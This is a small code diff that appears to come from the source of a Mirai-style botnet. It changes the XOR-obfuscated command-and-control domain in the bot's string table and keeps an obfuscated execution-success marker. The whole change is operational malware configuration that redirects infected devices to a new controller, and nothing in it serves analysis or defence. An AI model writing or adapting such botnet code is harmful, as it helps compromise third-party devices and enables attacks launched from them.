@@ -16,7 +16,7 @@ struct table_value table[TABLE_MAX_KEYS];
 void table_init(void)
 {
 
-    add_entry(TABLE_CNC_DOMAIN, "\x52\x50\x4D\x5A\x4F\x4D\x5A\x0F\x4E\x43\x40\x0C\x4E\x43\x56", 15);
+    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0F\x51\x47\x50\x54\x47\x50\x0C\x5A\x5B\x58", 14);
     add_entry(TABLE_EXEC_SUCCESS, "\x4A\x41\x40\x4B\x00\x2E", 6);
     
 
